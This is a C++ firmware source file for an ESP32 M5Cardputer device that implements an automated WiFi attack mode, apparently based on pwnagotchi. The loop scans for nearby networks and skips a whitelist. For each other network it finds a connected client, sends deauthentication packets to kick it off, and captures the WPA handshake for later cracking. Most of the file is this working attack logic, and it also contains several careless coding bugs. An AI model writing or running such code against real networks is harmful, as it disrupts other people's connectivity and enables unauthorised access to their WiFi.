#include "pwnagothi.h"
#include "WiFi.h"
#include "logger.h"
#include "settings.h"
#include "ArduinoJson.h"
#include "mood.h"
#include "networkKit.h"
#include "EapolSniffer.h"
#include "ui.h"

String pwnagothiWhitelist[30];
String pwnagothiMacWhitelist[30];
bool pwnagothiModeEnabled;
bool pwnagothiScan = true;
bool nextWiFiCheck = false;

bool pwnagothiBegin(){
    if(initPersonality() == false){
        logMessage("Personality init failed");
        return false;
    }
    if(!(WiFi.mode(WIFI_MODE_STA) && WiFi.scanNetworks(true, true))){
        return false;
    }   
    setMood(1, "(o_o)", "3 seconds for auto mode start... ESC to cancel");
    updateUi(true, false);
    WiFi.disconnect();
    uint32_t start = millis();
    while(millis() - start < 3000){
        M5.update();
        M5Cardputer.update();
        auto status = M5Cardputer.Keyboard.keysState();
        for(auto i : status.word){
            if(i=='`'){
                setMood(1, "(^_^)", "Pwnagothi mode cancelled");
                updateUi(true, false);
                delay(5000);
                return false;
            }
        }
    }
    WiFi.scanNetworks(true, true);
    logMessage("Pwnagothi auto mode init!");
    uint16_t trash;
    parseWhitelist(trash);
    pwnagothiMode = true;
    return true;
}

void addToWhitelist(String valueToAdd){
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    for(JsonVariant v : oldArray) {
        array.add(String(v.as<const char*>()));
    }
    array.add(valueToAdd);
    serializeJson(list, whitelist);
    saveSettings();
}

String* parseWhitelist(uint16_t& outCount){
    static String result[20000];
    outCount = 0;

    JsonDocument jsonWhitelist;
    DeserializationError err = deserializeJson(jsonWhitelist, whitelist);
    if (err) {
        logMessage("Failed to parse whitelist JSON");
        return result;
    }

    JsonArray array = jsonWhitelist.as<JsonArray>();
    for (JsonVariant v : array) {
        if (outCount >= 30) break;
        result[outCount++] = String(v.as<const char*>());
    }

    return result;
}

void parseMacFromWhitelist() {
  WiFi.mode(WIFI_MODE_STA);  // ensure we can scan
  int netCount = WiFi.scanNetworks(false, true);  // block, include hidden

  for (int i = 0; i < 30; i++) {
    if (pwnagothiWhitelist[i].length() == 0) continue;  // skip unused slots

    bool found = false;
    for (int n = 0; n < netCount; n++) {
      if (WiFi.SSID(n) == pwnagothiWhitelist[i]) {
        uint8_t* mac = WiFi.BSSID(n);
        char macStr[18];
        snprintf(macStr, sizeof(macStr),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        pwnagothiMacWhitelist[i] = String(macStr);
        found = true;
        break;
      }
    }

    if (!found) {
      pwnagothiMacWhitelist[i] = "";  // mark as not found
    }
  }
}

uint8_t wifiCheckInt = 0;

void pwnagothiLoop(){
    if(pwnagothiScan){
        logMessage("(<_>) Scanning..");
        setMood(1, "(<_>)", "Scanning..");
        updateUi(true, false);
        WiFi.scanNetworks();
        delayWithUI(50);
        if((WiFi.scanComplete()) >= 0){
            wifiCheckInt = 0;
            pwnagothiScan = false;
            logMessage("(*_*) Scan compleated proceding to attack!");
            setMood(1, "(*_*)", "Scan compleated proceding to attack!");
            updateUi(true, false);
            delayWithUI(100);
            //return;
        }
    }
    else{
        String attackVector;
        if(!WiFi.SSID(0)){
            logMessage("('_') No networks found. Waiting and retrying");
            updateUi(true, false);
            delayWithUI(50);
            pwnagothiScan = true;
        }
        if(wifiCheckInt < WiFi.scanComplete()){
            logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
        }
        else{
            pwnagothiScan = true;
            return;
        }
        attackVector = WiFi.SSID(wifiCheckInt);
        setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
        logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
        updateUi(true, false);
        delayWithUI(10);
        uint16_t wSize;
        String* whitelistParsed = parseWhitelist(wSize);
        logMessage("Size of whiletist: " + String(sizeof(whitelistParsed)));
        for(uint16_t i = 0; i<=wSize; i++){
            logMessage("Whietlist check...");
            if(whitelistParsed[i] == attackVector){
                setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                logMessage("(x_x) " + String("Well, ") + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                updateUi(true, false);
                delayWithUI(50);
                wifiCheckInt++;
                return;
            }
        }
        setMood(1, "(Y_Y)" , "I'm looking inside you " + attackVector + "...");
        updateUi(true, false);
        set_target_channel(attackVector.c_str());
        uint8_t i = 1;
        uint8_t currentCount = SnifferGetClientCount();
        setMac(WiFi.BSSID(wifiCheckInt));
        uint16_t targetChanel;
        uint8_t result = set_target_channel(attackVector.c_str());
        if (result != 0) { //if wifi is not found, enviroment had changed, so rescan to avoid kernel panic
            targetChanel = result;
        } else {
            pwnagothiScan = false;
            return;
        }
        initClientSniffing();
        String clients[50];
        int clientLen;
        unsigned long startTime = millis();
        logMessage("Waiting for clients to connect to " + attackVector);
        while(true){
            get_clients_list(clients, clientLen);
            if (millis() - startTime > 20000) { // 20 seconds timeout
                setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                SnifferEnd();
                updateUi(true, false);
                delay(70);
                break;
            }
            if(clients[i] != ""){
                logMessage("Client count: " + String(clientLen));
                setMood(1, "(d_b)", "I think that " + clients[i] + " doesn't need an internet..." );
                logMessage("WiFi BSSIS is: " + WiFi.BSSIDstr(wifiCheckInt));
                logMessage("Client BSSID is: "+ clients[clientLen]);
                logMessage("(d_b) I think that " + clients[i] + "doesn't need an internet...");
                updateUi(true, false);
                delayWithUI(20);
                stopClientSniffing();
                esp_wifi_set_promiscuous(false);
                break;
            }
            updateUi(true, false);
        }
        setMood(1, "(O_o)", "Well, well, well  " + clients[i] + " you're OUT!!!" );
        logMessage("(O_o) Well, well, well  " + clients[i] + " you're OUT!!!");
        updateUi(true, false);
        if(send_deauth_packets(clients[i], 200)){
            logMessage("Deauth succesful");
        }
        else{
            logMessage("Unknown error with deauth");
        }
        unsigned long startTime1 = millis();
        SnifferBegin(targetChanel);
        while(true){
            SnifferLoop();
            updateUi(true, false);
            delayWithUI(10);
            if (SnifferGetClientCount() > 0) {
                while (SnifferPendingPackets() > 0) {
                    SnifferLoop();
                    updateUi(true, false);
                }
                setMood(1, "(^_^)", "Got new handshake!!!" );
                logMessage("(^_^) Got new handshake!!!");
                SnifferEnd();
                updateUi(true, false);
                addToWhitelist(attackVector);
                pwned_ap++;
                sessionCaptures++;
                wifiCheckInt++;
                saveSettings();
                break;
            }
            if (millis() - startTime1 > 20000) { // 20 seconds timeout
                setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                SnifferEnd();
                updateUi(true, false);
                delay(70);
                break;
            }
        }
    }
    setMood(1, "(>_<)", "Waiting 3 seconds for next attack...");
    logMessage("(>_<) Waiting 3 seconds for next attack...");
    updateUi(true, false);
    delayWithUI(30);
}

void delayWithUI(uint16_t delayTime){
    logMessage("Waiting " + String(delayTime) + "ms");
    for(uint16_t timer; timer<=delayTime; timer++){
        M5.update();
        M5Cardputer.update();
        updateUi(true, false);
        delay(1);  // Delay for 1 ms to avoid blocking the UI
    }
}

void removeItemFromWhitelist(String valueToRemove) {
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    
    for (JsonVariant v : oldArray) {
        String item = String(v.as<const char*>());
        if (item != valueToRemove) {
            array.add(item);
        }
    }
    
    String newWhitelist;
    serializeJson(list, newWhitelist);
    whitelist = newWhitelist;
    saveSettings();
}

void setWhitelistFromArray(String* arr) {
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    size_t len = 0;
    // Calculate length by finding first empty string or hitting 30
    while (arr[len].length() > 0) {
        len++;
    }
    for (size_t i = 0; i < len; ++i) {
        array.add(arr[i]);
    }
    serializeJson(list, whitelist);
    saveSettings();
}
